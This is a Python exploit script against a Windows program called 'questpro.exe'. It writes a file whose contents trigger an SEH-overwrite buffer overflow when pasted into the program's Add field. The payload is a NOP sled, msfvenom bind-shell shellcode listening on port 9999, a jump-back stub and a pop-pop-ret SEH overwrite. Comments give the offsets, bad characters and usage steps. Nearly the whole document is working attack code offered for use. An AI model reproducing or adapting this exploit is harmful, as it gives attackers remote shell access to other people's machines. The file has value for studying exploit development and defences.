#!/usr/bin/python
#1- Open 'questpro.exe'
#2- Go to Add   
#3- Paste payload from generated txt file

File = 'bind9999.txt'

try:
    # SEH triggered by exception 'Access violation when reading [eax]'
    # - Crash at Instruction: 00403AB8    8B10       mov edx, dword ptr ds:[eax]
    # - EAX is overwritten by our buffer overflow
    # - SEH Record overwrite at 4116 bytes
    # Bad Characters: '\x00\x02\x03\x04\x05\x06\x07\x08\x0a\x0c\x0d'
    # - These bytes truncate the buffer
    nops     = '\x90'*400
    # msfvenom -p windows/shell_bind_tcp LPORT=9999 -v shellcode -a x86 --platform windows -b '\x00\x02\x03\x04\x05\x06\x07\x08\x0a\x0c\x0d' --format python
    #   x86/call4_dword_xor chosen with final size 352
    shellcode =  b""
    shellcode += b"\x2b\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0"
    shellcode += b"\x5e\x81\x76\x0e\xa3\xda\x2f\x1f\x83\xee\xfc"
    shellcode += b"\xe2\xf4\x5f\x32\xad\x1f\xa3\xda\x4f\x96\x46"
    shellcode += b"\xeb\xef\x7b\x28\x8a\x1f\x94\xf1\xd6\xa4\x4d"
    shellcode += b"\xb7\x51\x5d\x37\xac\x6d\x65\x39\x92\x25\x83"
    shellcode += b"\x23\xc2\xa6\x2d\x33\x83\x1b\xe0\x12\xa2\x1d"
    shellcode += b"\xcd\xed\xf1\x8d\xa4\x4d\xb3\x51\x65\x23\x28"
    shellcode += b"\x96\x3e\x67\x40\x92\x2e\xce\xf2\x51\x76\x3f"
    shellcode += b"\xa2\x09\xa4\x56\xbb\x39\x15\x56\x28\xee\xa4"
    shellcode += b"\x1e\x75\xeb\xd0\xb3\x62\x15\x22\x1e\x64\xe2"
    shellcode += b"\xcf\x6a\x55\xd9\x52\xe7\x98\xa7\x0b\x6a\x47"
    shellcode += b"\x82\xa4\x47\x87\xdb\xfc\x79\x28\xd6\x64\x94"
    shellcode += b"\xfb\xc6\x2e\xcc\x28\xde\xa4\x1e\x73\x53\x6b"
    shellcode += b"\x3b\x87\x81\x74\x7e\xfa\x80\x7e\xe0\x43\x85"
    shellcode += b"\x70\x45\x28\xc8\xc4\x92\xfe\xb2\x1c\x2d\xa3"
    shellcode += b"\xda\x47\x68\xd0\xe8\x70\x4b\xcb\x96\x58\x39"
    shellcode += b"\xa4\x25\xfa\xa7\x33\xdb\x2f\x1f\x8a\x1e\x7b"
    shellcode += b"\x4f\xcb\xf3\xaf\x74\xa3\x25\xfa\x75\xab\x83"
    shellcode += b"\x7f\xfd\x5e\x9a\x7f\x5f\xf3\xb2\xc5\x10\x7c"
    shellcode += b"\x3a\xd0\xca\x34\xb2\x2d\x1f\x84\xd5\xa6\xf9"
    shellcode += b"\xc9\xca\x79\x48\xcb\x18\xf4\x28\xc4\x25\xfa"
    shellcode += b"\x48\xcb\x6d\xc6\x27\x5c\x25\xfa\x48\xcb\xae"
    shellcode += b"\xc3\x24\x42\x25\xfa\x48\x34\xb2\x5a\x71\xee"
    shellcode += b"\xbb\xd0\xca\xcb\xb9\x42\x7b\xa3\x53\xcc\x48"
    shellcode += b"\xf4\x8d\x1e\xe9\xc9\xc8\x76\x49\x41\x27\x49"
    shellcode += b"\xd8\xe7\xfe\x13\x1e\xa2\x57\x6b\x3b\xb3\x1c"
    shellcode += b"\x2f\x5b\xf7\x8a\x79\x49\xf5\x9c\x79\x51\xf5"
    shellcode += b"\x8c\x7c\x49\xcb\xa3\xe3\x20\x25\x25\xfa\x96"
    shellcode += b"\x43\x94\x79\x59\x5c\xea\x47\x17\x24\xc7\x4f"
    shellcode += b"\xe0\x76\x61\xdf\xaa\x01\x8c\x47\xb9\x36\x67"
    shellcode += b"\xb2\xe0\x76\xe6\x29\x63\xa9\x5a\xd4\xff\xd6"
    shellcode += b"\xdf\x94\x58\xb0\xa8\x40\x75\xa3\x89\xd0\xca"
    jmp2nops   = '\xe8\xff\xff\xff\xff' # call +4       // This call will land us at the last \xff of our call instruction
    jmp2nops  += '\xc3'                 # ret/inc ebx   // Since EIP is at \xff after call, this will be interpruted as \xff\xc3 (inc ebx)
    jmp2nops  += '\x59'                 # pop ecx       // Pop the memory location from the call instruction that was pushed onto the stack into the ECX register
    jmp2nops  += '\x31\xd2'             # xor edx, edx  // Clear the EDX register. We are going to jump to the beginning of our buffer.
    jmp2nops  += '\x66\x81\xca\x04\x10' # or dx, 4090   // EDX is now equal to 0x00004100.
    jmp2nops  += '\x66\x29\xd1'         # sub ex, dx    // We subtract 4100 bytes from our memory location in the ECX register.
    jmp2nops  += '\xff\xe1'             # jmp ecx       // Now we jump back to the beginning of our buffer; into our NOP sled.
    offset     = '\x41' * (4116-len(nops+shellcode+jmp2nops))
    nSEH       = '\xeb\xeb\x90\x90'     # jmp short -22 (to jmp2nops)
    # 0x00400000 [questpro.exe]         | Rebase: False | ASLR: False | SafeSEH: False 
    # 0x0042666b [questpro.exe]         | pop ecx + pop ebp + ret  | {PAGE_EXECUTE_READ} 
    SEH        = '\x6b\x66\x42'         # SEH 3 byte overwrite
    payload    = nops+shellcode+offset+jmp2nops+nSEH+SEH
    f          = open(File, 'w')
    f.write(payload)
    f.close()
    print File + ' created successfully '
except:
    print File + ' failed to create'

